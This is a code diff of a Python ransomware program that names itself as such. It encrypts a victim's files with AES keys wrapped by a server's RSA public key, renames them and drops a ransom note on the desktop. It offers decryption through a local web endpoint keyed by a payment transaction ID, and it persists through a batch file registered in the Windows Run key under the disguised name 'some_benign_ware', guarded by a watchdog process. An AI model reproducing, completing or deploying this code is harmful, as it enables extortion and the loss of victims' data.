@@ -1,6 +1,5 @@
 import os
 import http_requests
-import ctypes
 import aes_cipher
 import rsa_cipher
 import shutil
@@ -9,7 +8,6 @@ from fastapi import FastAPI
 import uvicorn
 import multiprocessing
 import winreg as reg   
-import sys
 
 
 EXPLANATION_FILENAME = 'YOUR_FILES_ENCRYPTED.txt'
@@ -17,15 +15,14 @@ ENCRYPTED_FILE_TAG = 'ransom_encrypted'
 DIRECTORY_TO_ENCRYPT = 'RANSOM'
 
 
-
-
+########## LOCAL FASTAPI ##########
 
 app = FastAPI()
 
 @app.on_event('startup')
-async def startup():
-    
+async def startup():  
     await main()
+
 
 @app.get("/attempt_decrypt/{transaction_id}")
 async def attempt_decrypt(transaction_id: str):
@@ -41,7 +38,7 @@ async def attempt_decrypt(transaction_id: str):
 
 
 
-
+########## ENCRYPTION DECRYPTION LOGIC ##########
 
 
 # def iterate_all_files():
@@ -54,24 +51,29 @@ async def attempt_decrypt(transaction_id: str):
 
 # key always on line 2. Data begin from line 5
 async def encrypt_file(filepath):
-    with open(filepath, 'rb') as file:
-        data = file.read()
+    try:     
+        with open(filepath, 'rb') as file:
+            data = file.read()
 
-    key = aes_cipher.generate_key()
-    encripted_data = aes_cipher.encrypt(key, data)
+        key = aes_cipher.generate_key()
+        encripted_data = aes_cipher.encrypt(key, data)
 
-    new_file_data = encripted_data.decode('utf-8')
-    encrypted_key = rsa_cipher.encrypt(key)
-    encrypted_key = encrypted_key.decode('utf-8')
+        new_file_data = encripted_data.decode('utf-8')
+        encrypted_key = rsa_cipher.encrypt(key)
+        encrypted_key = encrypted_key.decode('utf-8')
 
-    new_file_body = f'-----KEY BEGIN-----\n{encrypted_key}\n-----KEY END-----\n\n{new_file_data}'
+        new_file_body = f'-----KEY BEGIN-----\n{encrypted_key}\n-----KEY END-----\n\n{new_file_data}'
 
-    with open(filepath, 'w') as file:
-        file.write(new_file_body)
+        with open(filepath, 'w') as file:
+            file.write(new_file_body)
 
-    os.rename(filepath, f'{filepath}.{ENCRYPTED_FILE_TAG}')
+        os.rename(filepath, f'{filepath}.{ENCRYPTED_FILE_TAG}')
 
-    print(f'File encryption successfull - {filepath}')
+        print(f'File encryption successfull - {filepath}')
+
+    except Exception as e:
+        print(f'problem encrypting file - {filepath}. Skipping it.')
+        print(e.message)
 
 async def decrypt_file(filepath):
     try:
@@ -132,11 +134,13 @@ async def decrypt_files(transaction_id):
     return 'Successfully decrypted files. If you want to use service again please run the ransomware again :)'
 
 
+# if not exists locally retrieve from server
+async def get_server_public_key():
+    file_name = "./keys/public.pem"
 
-async def get_server_public_key(file_name):
     try:
         if(os.stat(file_name).st_size != 0):
-            return 1;
+            return;
 
     except:
         pass
@@ -153,20 +157,17 @@ async def get_server_public_key(file_name):
         
         with open(file_name,"w") as f:
             f.write(data)
+
     except Exception as e:
-        print(e)
-   
-    return 0
+        print(f'Problem retrieving public key from server - {e.message}')
     
 
-    
+########## WATCHDOG AND PERSISTENCY ##########
 
 def watchdog(selected_pid):
     import time
-    
-
-    #ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "ransomware_watchdog_pid", 1)
     print(f'ransomware watchdog pid: {str(os.getpid())}')
+
     while True:
         time.sleep(5)
         #print(selected_pid)
@@ -181,6 +182,31 @@ def set_watchdog():
     p = multiprocessing.Process(target=watchdog, args=(pid_main,))
     p.start()
 
+
+def persistence():
+    try:
+        with open('start.bat','w') as f:
+            f.write('timeout /t 15\n')
+            f.write(f'chdir /d \"{str(os.getcwd())}\"\n')
+            f.write(f'python \"{str(os.getcwd())}\main.py\"\nexit')
+
+    except Exception as e:
+        print(f'Problem establishing persistancy - {e.message}')
+
+
+    current_path = str(os.getcwd()) + '\\start.bat'       
+    key = reg.HKEY_CURRENT_USER
+    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
+    with reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) as open_:
+        reg.SetValueEx(open_,"some_benign_ware",0,reg.REG_SZ,current_path)
+        reg.CloseKey(open_)
+
+    print('Wrote ransomware on startup successfully')
+
+
+
+########## MAIN ##########
+
 def create_dir(path):
     isExists = os.path.exists(path)
     isDir = os.path.isdir(path)
@@ -191,11 +217,9 @@ def create_dir(path):
     if(not isExists):
         os.makedirs(path)
 
-
 async def main():
-    #check_if_admin()
     create_dir('./keys/')
-    await get_server_public_key("./keys/public.pem")
+    await get_server_public_key()
     rsa_cipher.setup()
 
     await encrypt_files()
@@ -205,36 +229,14 @@ async def main():
     shutil.copy(EXPLANATION_FILENAME, desktop_path)
 
     print('Successully encrypted files')
- 
-      
-def persistence():
-    try:
-        with open('start.bat','w') as f:
-            f.write('timeout /t 15\n')
-            f.write(f'chdir /d \"{str(os.getcwd())}\"\n')
-            f.write(f'python \"{str(os.getcwd())}\main.py\"\nexit')
-    except Exception as e:
-        print(e)
 
-
-
-    current_path = str(os.getcwd()) + '\\start.bat'       
-    key = reg.HKEY_CURRENT_USER
-    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
-    with reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) as open_:
-        reg.SetValueEx(open_,"some_benign_ware",0,reg.REG_SZ,current_path)
-        reg.CloseKey(open_)
 
 def main_helper():
-    #ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "ransomware_pid", 1)
     persistence()
     print(f'ransomware main pid: {str(os.getpid())}')
     uvicorn.run("main:app", port=8074, host='127.0.0.1')
 
+
 if __name__ == "__main__":
-    
-    #ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "ransomware", 1)
-    #uvicorn.run(app, host="127.0.0.1", port=)
     set_watchdog()
     main_helper()
-    uvicorn.run("main:app", port=8074, host='127.0.0.1')
